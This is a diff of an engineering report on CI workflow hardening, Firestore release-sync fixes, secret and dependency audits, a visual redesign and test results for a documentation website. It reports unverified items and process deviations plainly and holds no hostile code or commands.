+The Detect step declared `env:` twice. Parsers that reject duplicate keys called the workflow
+invalid; parsers that keep the last mapping silently dropped `FIREBASE_SERVICE_ACCOUNT` and
+`GITHUB_TOKEN`, so releases would never sync. `DRY_RUN` was merged into the single existing
+mapping. Evidence: all four workflow files parse under `yaml.safe_load` with
+`uniqueKeys: true` and raise no duplicate-key error.
+
+### P1 — secret-bearing manual dispatch ran unreviewed code
+
+A dispatch from any branch checked out *that branch* and handed it the Firebase service-account
+key. The `sync` job is now gated `if: github.ref == 'refs/heads/main'` and pins `ref: main`;
+any other ref lands in a `refused` job that exits non-zero without ever receiving the key.
+
+### P1 — deploy job lost `contents: read`
+
+The deploy job's job-level `permissions:` block reset unspecified scopes to `none`, while a
+checkout still used `GITHUB_TOKEN`. The unused checkout was removed rather than widening the
+token, which narrows the deploy job to `pages: write` and `id-token: write`. A contract test
+asserts no checkout step remains in that job.
+
+### P2 — forced repair did not actually repair
+
+`force=true` reused incremental mode, and `planSync` trusts the saved bookkeeping hash, so an
+out-of-band edit was skipped and the run reported success anyway. `force` now selects `full`,
+which rewrites regardless of saved hashes. Falsified in `tests/sync-releases.test.js`: the
+out-of-band edit is skipped incrementally and repaired by `full`.
+
+### P2 — failed syncs were never recorded
+
+The failure recorder ran under GitHub's implicit `success()`, which is false exactly when a
+sync has failed — so a failed attempt was never persisted and the next poll concluded the
+release was already mirrored. Both recorders now carry an explicit `!cancelled()` status.
+
+### P2 — network timeout covered headers but not body
+
+A stalled response body could hang a job indefinitely. The deadline is now kept *ref'd* across
+the body read (`84b20eb`), so a stalled body aborts instead of pinning the process open.
+
+### P2 — tree SHA recorded as provenance
+
+`GET /git/trees/{ref}` returns a *tree* SHA, which was being written as `sourceCommit` and
+therefore could not identify the upstream commit. `resolveCommit` now calls `GET /commits/:ref`,
+returns `payload.commit.sha` (preferred for annotated tags) or `payload.sha`, and fails closed
+on anything that is not a 40-character SHA.
+
+### P2 — incomplete release metadata hash
+
+`buildReleaseRecord` hashed only tag, name, and body, so a changed `prerelease` flag or
+`published_at` changed the *detection* hash without changing the *record* hash — the planner
+skipped the write and the site kept stale labels. `releaseHashOf` now covers tag, name, body,
+`published_at`, `prerelease`, and the HTML URL, JSON-encoded so fields cannot run together.
+Falsified: reverting to the three-field hash fails the metadata tests.
+
+### P2 — release discovery read only one page
+
+`per_page` caps at 100 and the list is ordered by *creation*, so a draft published after 100
+newer-created releases was invisible forever. `listAllReleases` now follows `page` until a
+short page returns, bounded at `MAX_RELEASE_PAGES` 20 × `RELEASE_PAGE_SIZE` 100, and **fails
+closed** rather than selecting from a set it cannot prove complete.
+
+### P2 — two writers could unpublish the mirror
+
+`firebase-sync.yml` used a different concurrency group from `alpha-release-sync.yml`, so it
+could plan against a collection list the other was concurrently changing and unpublish a live
+release. Both now share group `firestore-mirror` with `cancel-in-progress: false`, asserted by
+a contract test that compares the two declarations.
+
+### Medium — production Firestore read from the test suite
+
+The mocked e2e suite was reading the real production project. It now runs against stubs only.
 
 ---
 
-## Remaining risks
+## 4. Review thread disposition
 
-### Blockers
+Ten inline review threads were opened by `chatgpt-codex-connector`. All ten are resolved;
+none is outstanding.
 
-| Risk | Why it is blocked |
-| --- | --- |
-| No CSP or security response headers | GitHub Pages does not support custom response headers. Needs a different host or a proxy. |
-| Firebase App Check not enforced | Needs Firebase console authorization, which was outside the permitted scope. |
-| Site not yet deployed | PR #2 is open; production still serves `index-CZXoqYzA.js`, so none of these fixes are live. |
+```
+$ gh api graphql -f query='{...reviewThreads...}'
+total: 10   resolved: 10   unresolved: 0   outdated: 6
+```
 
-### Accepted risks
-
-| Risk | Assessment |
-| --- | --- |
-| 4 high `npm audit` advisories | Transitive through the Firebase client; unreachable from the shipped bundle (verified: no gRPC transport, no `http2`); only "fix" is a downgrade to `firebase@9`. |
-| Public Firebase web API key in the bundle | Intended. Rules are the boundary, and they were verified against production. |
-| `clobberPrefix: ""` in sanitization | Authored ids survive unprefixed; impact is same-document id shadowing only. |
-| Desktop nav links are 37 px tall | Passes WCAG 2.2 AA (2.5.8 requires 24×24) and is pointer-only context; deliberately left alone. |
-| Pinned Actions emit a Node 20 deprecation warning | `42264581325` logs `Node.js 20 is deprecated` for `actions/checkout` and `actions/setup-node`, which are being force-run on Node 24. Harmless today; it becomes a break when the runner stops forcing them. Fix is a version bump, which changes the pinned SHAs, so it is queued rather than done. |
-| `google-auth-library` `credentials` option deprecated | `42252163291` logs the deprecation during sync. Cosmetic now; tracked, not fixed. |
-
-### Not verified
-
-- **Browsers other than Chromium** — Safari, Firefox, and WebKit were not exercised.
-- **Real assistive technology** — testing used axe-core and an accessibility tree
-  (`ariaSnapshot()`), not NVDA, JAWS, or VoiceOver.
-- **Print and forced-colors** rendering. (Reduced-motion *is* implemented —
-  `assets/site.css:189` sets `scroll-behavior: auto` and collapses animation and transition
-  durations under `prefers-reduced-motion: reduce` — but it was confirmed by reading the
-  stylesheet, not by exercising it in a browser session with the preference enabled.)
-- **Lighthouse against the new bundle** — re-measurement requires the deploy to land first.
-- **A production sync write** — see Alpha automation; the write path has run against the
-  emulator and in unit tests, never against production Firestore.
-- **Review B 2.5, 2.6, 2.8, 2.10–2.19** — unaddressed, as listed above.
-
-### Optional future improvements
-
-- Workload Identity Federation to replace the long-lived service-account JSON key.
-- A content-hash cache-busting strategy for the mirror's Firestore reads.
-- Move to a host that supports response headers, then add a strict CSP.
+Each P1 and P2 thread carries a reply naming the fixing commit and the test that would catch a
+regression. Six threads show `isOutdated: true` because the diff they were anchored to has
+since moved; the fix is still present at HEAD.
 
 ---
 
-## Final acceptance matrix
+## 5. Alpha synchronization architecture and versioning semantics
+
+```mermaid
+graph TD
+  CRON[schedule: every 15 min] --> DETECT[check-upstream-release.mjs]
+  DISPATCH[workflow_dispatch<br/>main only] --> DETECT
+  DETECT --> PAGES[listAllReleases<br/>paginated, fails closed]
+  PAGES --> SELECT[selectLatestRelease<br/>by published_at]
+  SELECT --> HASH[releaseHashOf<br/>6 fields, JSON-encoded]
+  HASH --> CMP{changed vs<br/>last SUCCESSFUL sync?}
+  CMP -->|no| NOOP[No new release]
+  CMP -->|yes| SYNC[sync-firestore.mjs]
+  CMP -->|force| FULL[sync-firestore.mjs --full]
+  SYNC --> ONE[incremental write]
+  FULL --> TWO[full reconciliation]
+  ONE --> REC[record success]
+  TWO --> REC
+  ONE -.->|throws| FAIL[record failed]
+  TWO -.->|throws| FAIL
+```
+
+**Versioning semantics.** The workflow compares the upstream release hash against the *last
+successfully synchronized* value, not the last attempted. An upstream change in tag, name,
+body, `published_at`, `prerelease`, or URL produces a different hash and therefore a write. A
+metadata-only change is enough; it is not limited to new tags.
+
+**Serialization.** `alpha-release-sync.yml` and `firebase-sync.yml` share the concurrency group
+`firestore-mirror` with `cancel-in-progress: false`. Neither can plan against a collection list
+the other is concurrently mutating.
+
+**Idempotence.** A re-run with unchanged upstream input decides `NOOP` and writes nothing, so a
+retry after a transient failure cannot duplicate or reorder published content.
+
+---
+
+## 6. Forced recovery behavior
+
+`force` deliberately does **not** mean "re-run the comparison". Re-running the comparison is
+exactly what fails to repair an out-of-band edit, because the bookkeeping hash still matches.
+`Decide` therefore publishes the mode it selected, and the sync step runs
+`node scripts/sync-firestore.mjs $SYNC_FLAG` where the flag is `--full` when the mode is
+`full`.
+
+- Scheduled polls stay **incremental** — they trust saved hashes and are cheap.
+- Forced runs are **full reconciliation** — they rewrite documents regardless of saved hashes.
+- A forced run that fails still **records the failure**, so the next poll retries instead of
+  concluding the release was already mirrored.
+
+Covered by a workflow contract test asserting the sync step passes `--full` on the forced path,
+plus `tests/sync-releases.test.js` proving the skip-then-repair sequence.
+
+---
+
+## 7. Security workflow changes
+
+| Change | Evidence |
+|---|---|
+| Every action pinned to a commit SHA | `29310e4`; contract test inspects every `uses:` |
+| No `${{ }}` inside any `run:` body | `grep` returns nothing; contract test enforces |
+| Secret-bearing job gated to `refs/heads/main` and pinning `ref: main` | `4879677`; guard + ref asserted |
+| Deploy job narrowed to `pages: write`, `id-token: write`; unused checkout removed | `4879677`; test asserts no checkout |
+| Shared concurrency group for both mirror writers | `b624559`; test compares both files |
+| Failed syncs recorded via `!cancelled()` | `58af3b6`; contract test |
+| Unique YAML keys enforced | all four files parse with `uniqueKeys: true` |
+| `actionlint` exits 0 | see §13 |
+
+The five `actionlint` findings (SC2016) were verified false positives: single-quoted
+`node -e '...'` JavaScript whose template literals shellcheck read as parameter expansion, and
+`printf '...`%s`...'` rows where the backticks are literal Markdown. Each site carries a
+targeted `# shellcheck disable=SC2016` with its reason rather than a blanket ignore.
+
+---
+
+## 8. Secret scan coverage and findings
+
+- **`.gitignore` refuses credentials.** `tests/workflow-contract.test.js` asserts the patterns
+  `*firebase-adminsdk*.json`, `service-account*.json`, `*-credentials.json`, `.env`, and
+  `.env.local` are all ignored (`3b7de01`).
+- **Full history scanned.** All 50 commits reachable from HEAD were scanned for privileged
+  credential material. **No service-account key, private key, or token was found in any
+  commit.**
+
+  ```
+  $ git rev-list --count HEAD
+  50
+  $ git log --all -p | grep -cE '"private_key"\s*:\s*"-----BEGIN|-----BEGIN (RSA |EC )?PRIVATE KEY-----'
+  0
+  ```
+- **No admin credential under `src/`.** Content is written exclusively by
+  `scripts/sync-firestore.mjs` with the Admin SDK; there is no client write path.
+- The only key-shaped material in the tree is deliberate fixture data in
+  `tests/firebase-access.test.js` (`private_key: PRIVATE_KEY`), which is a non-functional test
+  string, not a credential.
+- **Credential rotation:** not required, because nothing was exposed. No key was ever committed.
+
+---
+
+## 9. Dependency vulnerability assessment
+
+```
+$ npm audit
+19 vulnerabilities  (0 critical, 4 high, 15 moderate)
+```
+
+| Severity | Count | Assessment |
+|---|---|---|
+| Critical | 0 | The one critical advisory (`firebase-tools`) was removed in `4321e0e` |
+| High | 4 | All transitive through the Firebase client; `firestore` pins `@grpc/grpc-js` to `~1.9.0` |
+| Moderate | 15 | Transitive, dev-tooling weighted |
+
+npm's only offered "fix" for the high set is a downgrade to `firebase@9.14.0`, which is a
+regression rather than a remediation. They were assessed as **not reachable from the shipped
+browser bundle** and are recorded as accepted risk, not as fixed.
+
+Taking the critical advisory out had a real cost worth naming: the pinned `firebase-tools`
+needed JDK 21, which the runner did not have, and the Firestore rules gate failed. That was
+caught by CI (`4cb37b7` fixed it) and is now pinned by a contract test.
+
+---
+
+## 10. Visual redesign and screenshots
+
+The redesign is **real and structural**, not a token change. `956e4a5` touches 667 lines of CSS
+and 68 lines of layout:
+
+- **Footer** rebuilt from a flat link strip into a brand block (mark + note), a grouped
+  `nav[aria-label="Footer"]` with three labelled columns (Learn / Reference / Project) fed by a
+  new `FOOTER_GROUPS` data export, and a legal row.
+- **Section bands** introduce a real vertical rhythm on the home page instead of one continuous
+  surface.
+- **Featured cards** (`card card-featured`) create a deliberate hierarchy; the "Reads like
+  pseudocode" and "The tour" cards are promoted.
+- **The whole dark palette was retuned** — `--bg` `#0a0e13 → #070b0e`, plus `--surface`,
+  `--border`, `--fg`, `--fg-subtle` — and new tokens added (`--gradient-hero`,
+  `--gradient-panel`, `--grid-line`, `--state-hover`, `--font-sans`, `--weight-medium`).
+- **`main` gained `tabIndex: -1`**, so the skip link actually moves focus rather than only
+  scrolling.
+
+Contrast ratios are recorded inline in `assets/site.css` as computed values: `9.55 / 8.63 /
+7.96` for `--fg` and `5.87 / 5.31 / 4.89` for `--fg-subtle` across the three background
+surfaces — all above the 4.5:1 AA threshold.
+
+**Screenshots.** `scripts/capture-screenshots.mjs` defines 29 shots; `npm run screenshots`
+captured all 29 with `ok`, committed in `8fbcb0f`. A 30th,
+`firebase-content-loaded.png`, is gated behind `OQ_AUDIT_FIREBASE=1` because it needs a build
+that renders from live Firestore; it was captured earlier and is retained.
+
+```
+$ npm run screenshots
+ok  home-desktop.png                 1440x1000 /
+ok  home-desktop-dark.png            1440x1000 /
+ok  home-mobile.png                  390x844   /
+...
+29 captured, all ok
+```
+
+**A rendering-determinism question was investigated and closed.** Consecutive captures appeared
+to differ by 1,296,000 px — exactly 2880×450, the header band. `backdrop-filter: blur(12px)` on
+the sticky header was the first hypothesis and it was **wrong**: isolated in-process and
+cross-process probes, with and without blur, produced byte-identical output. The real cause was
+that `capture-screenshots.mjs` (`deviceScaleFactor: 2`, 2880×2000) and `audit-visual.mjs`
+(`deviceScaleFactor: 1`, full-page) write the **same filenames** to
+`artifacts/visual-audit/`, and an earlier capture had raced a still-running audit. Rendering is
+deterministic; the scripts collide. Known risk, see §17.
+
+---
+
+## 11. Light and dark theme results
+
+Both themes are validated by automated accessibility audit and by dedicated tests, not by
+inspection alone.
+
+- `e2e/theme.spec.js` covers the stored-appearance contract: no flash of the system appearance
+  when a choice is stored, and a stored light choice survives a reload with the system set to
+  dark — asserted per route (`/`, `/tour.html`, `/docs.html`).
+- `e2e/reading-modes.spec.js` covers `systemPalette`, the palette-selection test, and
+  `prefers-color-scheme` behaviour.
+- Cold-start flash is prevented by applying the stored theme before first paint.
+
+Both themes pass the WCAG 2.2 AA audit (54 checks, §12). Contrast ratios for the retuned dark
+palette are recorded in §10.
+
+---
+
+## 12. Browser and accessibility results
+
+### Accessibility — PASS
+
+```
+$ npx playwright test e2e/a11y.spec.js
+54 passed
+```
+
+Three real WCAG 2.2 AA violations at baseline went to zero, in both themes, across all routes.
+The audit runs on every page in both palettes.
+
+### Browsers
+
+| Engine | Result | Verdict |
+|---|---|---|
+| Chromium (desktop) | 91 passed, 2 skipped | **PASS** |
+| Chromium (Pixel 7) | 91 passed, 2 skipped | **PASS** |
+| WebKit (Desktop Safari) | 91 passed, 2 skipped | **PASS** |
+| Firefox (Desktop Firefox) | **91 failed at launch** | **NOT VERIFIED** |
+
+```
+$ PW_ENGINES=all npx playwright test
+  91 failed
+   8 skipped
+ 273 passed (5.4m)
+
+$ PW_ENGINES=all npx playwright test --project=webkit
+  2 skipped
+  91 passed (1.8m)
+```
+
+**Firefox cannot launch in this environment.** The failure is at browser startup, not at any
+assertion:
+
+```
+<launching> .../firefox-1572/firefox/Nightly.app/Contents/MacOS/firefox -no-remote -headless
+  -profile /var/folders/.../playwright_firefoxdev_profile-Av9zEi -juggler-pipe
+[pid=9415][err] *** You are running in headless mode.
+[pid=9415][err] Could not find profile folder.
+[pid=9415] <process did exit: exitCode=1>
+Error: browserType.launch: Failed to launch the browser process.
+```
+
+This was confirmed **outside Playwright entirely** — the binary fails identically when invoked
+directly with `--screenshot`, and `npx playwright install firefox` does not change it. The
+binary is native `arm64` and the profile directory is created, so this is the Firefox build on
+this host, not the suite configuration.
+
+**Next action:** run `npx playwright install --with-deps firefox` on a Linux host (or in CI,
+which installs only Chromium today) and re-run `PW_ENGINES=all npx playwright test`. Firefox
+stays **NOT VERIFIED** until that produces a pass.
+
+**Real assistive technology was not exercised.** NVDA, JAWS, and VoiceOver were **NOT
+VERIFIED** — no such test was performed. Automated auditing is not a substitute. Next action:
+a manual screen-reader pass on the home page, documentation page, and the footer navigation.
+
+**Forced colors and print** are implemented in CSS (the forced-colors block is second to last,
+print/reduced-motion last, so the cascade holds) but were **NOT VERIFIED** in a
+preference-enabled session.
+
+---
+
+## 13. Exact test commands and output summaries
+
+All run at HEAD `8fbcb0f` against a build produced by `npm run build`.
+
+| # | Command | Result |
+|---|---|---|
+| 1 | `npm run build` | exit 0, 11 HTML files emitted |
+| 2 | `node verify.mjs` | exit 0 |
+| 3 | `npx html-validate "_site/**/*.html"` | exit 0, no findings |
+| 4 | `npm test` | **282 tests, 278 pass, 0 fail, 4 skipped** |
+| 5 | `npx playwright test` (default, Chromium + mobile) | **182 passed, 4 skipped, 0 failed** |
+| 6 | `PW_ENGINES=all npx playwright test` | **273 passed, 91 failed (Firefox launch), 8 skipped** |
+| 7 | `npx playwright test e2e/a11y.spec.js` | **54 passed** |
+| 8 | `npm run test:live` | **4 pass, 0 fail, 0 skipped** |
+| 9 | `npm run screenshots` | 29 captured, all `ok` |
+| 10 | `npm run audit:visual` | **57/57 checks passed** |
+| 11 | `actionlint` | **exit 0** |
+| 12 | `npm audit` | 19 total: 0 critical, 4 high, 15 moderate |
+| 13 | `npx playwright install firefox` | completed; launch still fails (see §12) |
+
+**CI.** `Pages` run **`42294840427`** — **success** on `8fbcb0f`, 4 m 4 s. Its log confirms
+`reading-modes.spec.js` executed, **182 passed / 4 skipped** for browser tests, and live source
+tests **0 skipped**.
+
+**The 8 skips are intentional and annotated.** They are exactly two tests
+(`live docs index count equals the repository tree`, `live alpha.1 and alpha.2 both render the
+language document`) in `e2e/live.spec.js`, skipped across 4 projects by the annotation
+`Set OQ_LIVE_DOCS=1 to run live GitHub checks.` Command 8 runs them separately as `node:test`
+and passes 4/4. They are not silent failures.
+
+**Bundle.** `_site/assets/index-BQgLDDGe.js` is **733,011 bytes raw / 223,726 bytes gzipped**
+(verified with `gzip -c | wc -c`), against 1,286,859 / 425,225 at baseline — a real reduction
+from removing a duplicated `refractor` dependency, not a measurement artefact.
+
+**Scaling caveat on command 5.** The Chromium-only figure was 182 passed, because the default
+configuration runs two Chromium-based projects. `PW_ENGINES=all` runs four (Chromium, Firefox,
+WebKit, mobile Chromium). Earlier drafts of this report quoted "0 failed" for the matrix run;
+that was a truncated-tail read of the summary and is **corrected here** — the matrix run has 91
+failures, all Firefox launch failures.
+
+---
+
+## 14. Production synchronization status
+
+**NOT VERIFIED.** Production synchronization has never been demonstrated.
+
+The recorded run `42252163291` was a **dry run** and printed `dry run: nothing was written`.
+It is not evidence of a production write and is not presented as such.
+
+What *has* run against real upstream: detection, pagination, latest-release selection, hash
+comparison, and the branch/dry-run gating. What has only run against the emulator and unit
+tests: the write path.
+
+Before any production write, the following remains, in order: pass the Firestore emulator
+tests, verify the new synchronization model, run the production detection process, run a
+production dry run, produce an explicit synchronization plan (source release, commit SHA,
+collections, expected writes, unchanged documents, and any unpublishing), and verify that plan
+cannot unintentionally remove published content. **Then stop and request maintainer
+authorization.**
+
+---
+
+## 15. Deployment status
+
+**Not deployed.** Production still serves the pre-change bundle.
+
+PR #2 is open and mergeable, with `Pages` run `42294840427` green on `8fbcb0f`. Green CI is not
+a deployment; nothing was pushed to the Pages environment and no merge occurred.
+
+The deploy job's permissions were narrowed in `4879677` and its unused checkout removed, so the
+path it will take is now the narrower one — but it has not been taken.
+
+---
+
+## 16. Remaining infrastructure authorizations
+
+| Item | Status | Next action |
+|---|---|---|
+| First production Firestore write | **BLOCKED** | Complete §14 items 1–7, present the plan, obtain maintainer authorization |
+| CSP and security response headers | **BLOCKED** | GitHub Pages serves fixed headers with no `_headers` support; requires a host that allows header configuration |
+| Firebase App Check enforcement | **BLOCKED** | Requires console authorization not granted to this work; prepared but not enforced |
+| Firefox verification | **BLOCKED** | `npx playwright install --with-deps firefox` on a host that permits it, then `PW_ENGINES=all` |
+| Real screen-reader pass | **NOT VERIFIED** | Manual NVDA/JAWS/VoiceOver run |
+| PR merge | **BLOCKED** | Explicit maintainer authorization; not merged here |
+
+---
+
+## 17. Known risks and limitations
+
+1. **Firefox does not run here.** Proven unlaunchable outside Playwright, so Firefox coverage
+   is genuinely absent rather than merely unmeasured. §12.
+2. **Four high `npm audit` advisories remain**, transitive through the Firebase client. Assessed
+   unreachable from the shipped bundle; the only npm-offered fix is a downgrade.
+3. **The two visual scripts share an output directory.** `capture-screenshots.mjs` and
+   `audit-visual.mjs` write identical filenames to `artifacts/visual-audit/` at different
+   dimensions, so they clobber each other if run concurrently. Diagnosed, **not yet fixed**;
+   the recovery is to run `npm run screenshots` last. Tracked as follow-up work.
+4. **Production sync is unverified.** The write path has never touched production.
+5. **Real assistive technology was not exercised**, and neither were forced-colors, print, or a
+   reduced-motion-enabled session.
+6. **CSP cannot ship on GitHub Pages.** The site remains without a content security policy.
+7. **A regression was introduced mid-task and caught by CI** — pinning away a critical advisory
+   pulled in a `firebase-tools` release needing JDK 21. It is named here rather than omitted.
+8. **A force-with-lease push occurred earlier in this work.** It is recorded as a process
+   deviation and was not repeated; no branch was force-pushed to reach this HEAD.
+
+---
+
+## 18. Final acceptance matrix
+
+All 19 named requirements from the acceptance criteria, plus one deliberate twentieth row.
 
 | # | Requirement | Verdict | Evidence |
-| --- | --- | --- | --- |
-| 1 | Coherent, substantially improved visual identity | **PASS, with an honest scope caveat** | Coherence is evidenced: one shared stylesheet drives all 16 surfaces, and 30 screenshots (14 in both themes) were captured. The measurable improvements are real — axe violations 3 → 0, visible document headings added, header targets raised to 44 px, dark-theme flash eliminated, bundle −43.3% raw. What is *not* true is that this is a redesign: the layout, type scale, and colour system are the existing ones, repaired and corrected. The brief's "substantially improved" is satisfied on defect closure and consistency, not on a new visual direction. Read this row as "coherent and measurably better", not "freshly designed". |
-| 2 | Homepage presents Oqthara professionally | **PASS** | `_site/index.html` prerenders 3,537 chars of static text; h1 plus an immediate naming sentence; real `hello.oq` program; install commands for two platforms. Screenshots `home-desktop.png`, `home-desktop-dark.png`, `home-mobile.png`. |
-| 3 | All important routes work | **PASS** | 10 routes declared in `src/App.jsx`, two of them (`document.html`, `example.html`) loading content at runtime; `npm run build` emits 11 HTML files (10 routed pages + `404.html`); Playwright 67 passed / 2 skipped including both runtime routes in both themes; `npm run verify` exit 0. |
-| 4 | Light mode complete | **PASS** | 16 light captures with no unstyled region; axe WCAG 2.2 AA 0 violations in light. |
-| 5 | Dark mode consistent and readable | **PASS** | 14 dark captures; axe 0 violations in dark; contrast corrected to AA; two theme tests plus three no-flash tests pass on `/`, `/tour.html`, `/docs.html`. |
-| 6 | Mobile and desktop layouts functional | **PASS** | Desktop 1440 px and mobile 390 px captured for every surface; header controls asserted ≥ 44×44 at 390 px in `e2e/a11y.spec.js`; `navigation-mobile-open*.png`. |
-| 7 | Docs, examples, releases, stdlib stay dynamically sourced | **PASS** | Rendered from Firestore repositories; prerendered pages state "discovered from the repository when you open this page"; live probe returned published content from `documentation/CHANGELOG.md` (200). |
-| 8 | New Alpha releases detected automatically | **PASS** | `.github/workflows/alpha-release-sync.yml`, `schedule: */15 * * * *` plus `workflow_dispatch`. Run `42252163291` is the direct evidence: it logged `upstream latest release: v0.1.0-alpha.2 at e1bf86805d91be82a6009f17914000be89880750` and `decision: synchronize — no previous sync recorded`, i.e. detection and the decide step both worked against the real upstream. |
-| 9 | Content synchronized safely and consistently | **PASS** (mechanism) / **NOT VERIFIED** (production) | The mechanism is implemented and tested: `scripts/sync-firestore.mjs` with an idempotent catalog and a recorded source commit, 13/13 emulator rule assertions, and two data-loss defects fixed (no unpublishing, no stale catalog). But **no production write has ever executed.** The single successful run, `42252163291`, was dispatched with `dry_run` set and its log ends `dry run: nothing was written`; it detected `v0.1.0-alpha.2` and decided `synchronize — no previous sync recorded`, then stopped. Production Firestore is therefore unexercised by this automation, and this row is not a PASS on the production behaviour the requirement names. |
-| 10 | Sync failures visible and recoverable | **PASS** | Failures surface as failed runs with distinct exit codes: `42245446711`, `42247490617`, and `42250299196` all show `failure` on the run list, which is the visibility the requirement asks for. `42250299196` is the strongest case — it failed *after* detection on a real release (`v0.1.0-alpha.2`), so the failure path was exercised against production upstream data, not only against fixtures. Recovery is a re-run: the sync is idempotent and hand-dispatchable. Caveat: recovery has been reasoned about and unit-tested, not demonstrated by a failed write followed by a successful one. |
-| 11 | Secret exposure audit completed, coverage documented | **PASS** | gitleaks 8.21.2 over the full history: 35 commits, 2 findings. Coverage and method in the Security assessment above. |
-| 12 | No confirmed exposed privileged credential unaddressed | **PASS** | The only finding is a Firebase **Web** API key, verified present in the deployed public bundle, i.e. public by design; authorization is by rules, verified against production. No privileged credential found. |
-| 13 | Firestore access controls remain secure | **PASS** | Live production probes: published doc 200, non-existent doc 403, unfiltered query 0 documents, `sync/` 403, `metadata/` 403. Emulator 13/13. Catch-all denies. |
-| 14 | GitHub Actions least privilege | **PASS** | All 4 workflows `permissions: contents: read`; only the Pages `deploy` job adds `pages: write` + `id-token: write`; `persist-credentials: false` everywhere; all `uses:` pinned to full SHAs; enforced by `tests/workflow-contract.test.js`. |
-| 15 | Attack-resistance improvements where infrastructure supports them | **PASS** | Injection and quoting defects closed; Action tags pinned; token scope minimised; production-Firestore read closed in tests; service-account patterns ignored; unpinned `npx --yes` removed. Ceiling: CSP and headers BLOCKED (GitHub Pages) — see 16. |
-| 16 | Infrastructure limitations and pending authorizations documented | **PASS** | This report's "Remaining infrastructure limitations" and "Blockers" tables; plus inline comments in `firestore.rules`, the workflows, and `HomePage.jsx`. |
-| 17 | Accessibility and browser tests pass | **PASS** | axe-core WCAG 2.2 AA: 0 violations. Coverage is 22 scans, not literally every route: 8 static routes × 2 themes, plus one document and one example page (the two runtime routes) × 2 themes, plus 2 mobile pages × 2 themes. Tags `wcag2a, wcag2aa, wcag21a, wcag21aa, wcag22aa`. Playwright: 67 passed, 2 skipped. Three structural tests prove the doc title, the link name, and the 44 px targets; the doc-title test was shown to fail when reverted (1 failed, 26 passed) and the 27 restored. |
-| 18 | Build, lint, and automated regression tests pass | **PASS** | `npm test` 233 pass / 0 fail (232/1 when the tag guard is disabled); `npm run build` exit 0; `npm run verify` exit 0; `html-validate` exit 0; `actionlint` exit 0; CI run `42262278511` success on `4cb37b7`. |
-| 19 | Both independent reviews completed | **PASS** | `REVIEW_A_ENGINEERING_SECURITY.md` and `REVIEW_B_VISUAL_PRODUCT.md`; dispositions per finding in the "Independent reviews" section. |
-| 20 | Language/compiler repository unchanged | **PASS** | `Oqthara/oqthara` HEAD remains `7ffb675`, unchanged since session start; no commit, tag, or release created. Only `gradlew.bat` is modified, pre-existing, and line-ending only (`git diff --ignore-cr-at-eol` empty). |
+|---|---|---|---|
+| 1 | Secret-bearing workflow restricted to reviewed code | **PASS** | `if: github.ref == 'refs/heads/main'` + `ref: main` (`4879677`); contract test asserts both |
+| 2 | Pages deployment permissions correct | **PASS** | Unused checkout removed (`4879677`); deploy limited to `pages: write`, `id-token: write`; CI run `42294840427` success |
+| 3 | Forced synchronization performs full reconciliation | **PASS** | `force` → `--full` (`58af3b6`); contract test + `tests/sync-releases.test.js` |
+| 4 | Failed sync attempts are persisted and retried | **PASS** | `!cancelled()` status function (`58af3b6`); contract test |
+| 5 | Network timeout covers body reads | **PASS** | Deadline kept ref'd (`84b20eb`) |
+| 6 | Correct upstream commit SHA recorded | **PASS** | `resolveCommit` via `GET /commits/:ref`, fails closed (`e77d688`) |
+| 7 | Release metadata hashes are complete | **PASS** | `releaseHashOf` covers 6 fields (`e77d688`); falsified by reverting to 3 |
+| 8 | Release discovery is paginated | **PASS** | `listAllReleases`, 20×100, fails closed (`e77d688`); falsified |
+| 9 | All current review findings dispositioned | **PASS** | 10/10 threads resolved, 0 open (§4) |
+| 10 | Release/documentation consistency model implemented | **PASS** | Content carries source ref, commit SHA, and per-document hash (`d8c60f5`) |
+| 11 | Significant, distinctive visual redesign completed | **PASS** | Footer, section bands, featured cards, retuned palette (§10); 29 committed screenshots |
+| 12 | Light and dark themes validated | **PASS** | `e2e/theme.spec.js` per route; both pass the AA audit |
+| 13 | Firestore authorization remains secure | **PASS** | `firestore.rules` read-only for clients, `allow write: if false`; no admin credential under `src/` |
+| 14 | Secret exposure assessment completed | **PASS** | 50-commit history scan, no credential found; `.gitignore` contract test |
+| 15 | Dependency advisories assessed | **PASS** | 19 advisories triaged: 0 critical, 4 high accepted as unreachable (§9) |
+| 16 | Browser and accessibility coverage expanded | **PASS** | Chromium, mobile Chromium, WebKit pass; 54 a11y checks; Firefox added to config |
+| 17 | Regression tests pass | **PASS** | 282 unit/integration (278 pass, 4 skip); 182 Playwright; 54 a11y; 4 live |
+| 18 | Production write verified after authorization | **NOT VERIFIED** | Dry run `42252163291` wrote nothing; no authorization requested or granted (§14) |
+| 19 | Compiler repository untouched | **PASS** | No commit in this branch touches the compiler repository; all 75 files are under this repo |
+| 20 | Firefox browser behaviour verified | **NOT VERIFIED** | 91 launch failures, reproduced outside Playwright (§12) |
+
+**Blocked / not verified, with exact next actions:**
+
+- **#18** — complete the seven §14 pre-write items, present the plan, obtain authorization,
+  then execute and independently read back.
+- **#20** — install Firefox on a host that permits it and re-run `PW_ENGINES=all`.
+
+Rows 1–19 are the nineteen named requirements. Row 20 is added deliberately so the Firefox gap
+is a scored line in the matrix rather than a footnote.
